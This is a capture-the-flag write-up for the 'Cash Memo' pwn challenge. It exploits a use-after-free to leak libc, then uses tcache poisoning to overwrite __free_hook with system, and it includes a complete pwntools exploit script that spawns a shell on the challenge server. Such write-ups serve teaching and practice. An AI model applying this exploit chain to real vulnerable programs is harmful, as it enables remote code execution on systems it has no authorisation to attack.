https://ctftime.org/event/2657

# Cash Memo (pwn)

I have a really hard time managing my cash, am afraid someone might steal my memos...

nc chall.ehax.tech 1925

## Analysis

`mallocc` @ `0x1269`:

- `arr[idx] = malloc(sz);`
- `arr_size[idx] = sz;`

`freee` @ `0x13bb`:

- `free(arr[idx]);`
     - Note: the pointer is left unchanged so we can perform a use after free with `edit` and `view`

`edit` @ `0x1470`:

- `fgets(*(char*)arr[idx], arr_size[idx], stdin);`

`view` @ `0x154a`:

- `puts(*(char*)arr[idx]);`

Note: we are given version 2.31 of libc.

Given the 4 functions above and the version of libc we can aim to control `__free_hook`.

We can use tcache poisoning to do this https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c. We can do this by using `freee` to call `free` on the allocation while retaining the address and then using `edit` to modify the `fd` pointer to point to libc's `__free_hook`.

However first we'll need to leak the libc base to bypass libc aslr. We can do this by using `view` to read the `fd` pointer ( which is a libc pointer ) after a chunk is placed in the unsorted bin. We just need to make sure that we free a large enough chunk that won't get consolidated in the process.

### Calculating The libc ASLR Base

The offset of `0x1ecbe0` used to calculate the libc aslr base is found by using the `pwndbg` command `xinfo` on the `fd` pointer while it is in the unsorted bin.

First here's the order of operations:

```python
menu_new(0, 0x600, b"A") # leak libc from unsorted bin
menu_new(1, 0x600, b"B")
menu_new(2, 0x600, b"C")
menu_delete(1)
leak = u64(menu_view(1)[:-1] + b"\x00\x00")
libc.address = leak - 0x1ecbe0
log.success(f"libc: {hex(libc.address)}")
```

Use `heap` right before the call to `puts` in `view`:

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x63a2321a5000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x63a2321a5290
Size: 0x610 (with flag bits: 0x611)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x63a2321a58a0
Size: 0x610 (with flag bits: 0x611)
fd: 0x764de338dbe0
bk: 0x764de338dbe0

Allocated chunk
Addr: 0x63a2321a5eb0
Size: 0x610 (with flag bits: 0x610)

Top chunk | PREV_INUSE
Addr: 0x63a2321a64c0
Size: 0x1fb40 (with flag bits: 0x1fb41)
```

We're interested in the allocation with an address of `0x63a2321a58a0`. You can see that the `Free chunk (unsortedbin)` has an `fd` of `0x764de338dbe0` we can use `xinfo` to see the offset as follows:

```
pwndbg> xinfo 0x764de338dbe0
Extended information for virtual address 0x764de338dbe0:

  Containing mapping:
    0x764de338d000     0x764de338f000 rw-p     2000 1eb000 /home/user/ctf/cash_memo/libc-2.31.so

  Offset information:
         Mapped Area 0x764de338dbe0 = 0x764de338d000 + 0xbe0
         File (Base) 0x764de338dbe0 = 0x764de31a1000 + 0x1ecbe0
      File (Segment) 0x764de338dbe0 = 0x764de3389788 + 0x4458
         File (Disk) 0x764de338dbe0 = /home/user/ctf/cash_memo/libc-2.31.so + 0x1ebbe0

 Containing ELF sections:
               .data 0x764de338dbe0 = 0x764de338d1a0 + 0xa40
```

Specifically we are interested in this line `File (Base) 0x764de338dbe0 = 0x764de31a1000 + 0x1ecbe0`.

Now to compute the libc base we simply do the following:

```python
u64(menu_view(1)[:-1] + b"\x00\x00") - 0x1ecbe0
```

Note: we almost always get 6 bytes when calling `puts` on an address to points within libc so you'll need to add 2 zero bytes with functions, like `u64`, that expect 8 bytes.

## Solution

1) Use https://github.com/io12/pwninit to patch the binary to use the provided libc and ld
2) Leak libc address to bypass libc aslr by exploiting use-after-free to read libc pointers from a chunk in the unsorted bin
3) Use tcache poisoning to set `__free_hook` equal to `system`
4) Free memory that points to `b"/bin/sh\x00"` to call `system("/bin/sh")` via `__free_hook`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc-2.31.so", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chall.ehax.tech", 1925)

def menu_new(idx, sz, payload):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())
    p.sendlineafter(b"how big?\n> ", str(sz).encode())
    p.sendlineafter(b"first payload?\n> ", payload)

def menu_delete(idx):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())

def menu_edit(idx, payload):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())
    p.sendlineafter(b"New contents?\n> ", payload)

def menu_view(idx):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())
    return p.readline()

menu_new(0, 0x600, b"A") # leak libc from unsorted bin
menu_new(1, 0x600, b"B")
menu_new(2, 0x600, b"C")
menu_delete(1)
leak = u64(menu_view(1)[:-1] + b"\x00\x00")
libc.address = leak - 0x1ecbe0
log.success(f"libc: {hex(libc.address)}")

menu_new(0, 128, b"A") # tcache poisoning
menu_new(1, 128, b"B")
menu_delete(0)
menu_delete(1)
menu_edit(1, p64(libc.sym["__free_hook"]))
menu_new(0, 128, b"/bin/sh")
menu_new(1, 128, b"")
menu_edit(1, p64(libc.sym["system"]))
menu_delete(0)

p.sendline(b"/bin/cat flag.txt")
print(p.readline().decode()[:-1]) # EH4X{fr33_h00k_c4n_b3_p01ns0n3d_1t_s33m5}
```

## Flag
`EH4X{fr33_h00k_c4n_b3_p01ns0n3d_1t_s33m5}`

smiley 2025/02/16
